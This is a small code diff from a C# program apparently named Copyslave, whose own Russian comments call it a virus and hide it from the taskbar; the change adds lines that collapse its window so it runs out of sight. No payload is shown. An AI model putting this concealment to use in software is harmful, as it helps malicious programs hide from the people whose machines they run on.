@@ -29,6 +29,9 @@ namespace Copyslave
             
             //Скрываем вирус от панели задач
             this.ShowInTaskbar = false;
+
+            progressBar1.Value = (100);
+            Windows1.Visibility = Visibility.Collapsed; //Скрываем форму
         }
 
         public void Timer_Tick(object sender, EventArgs e)
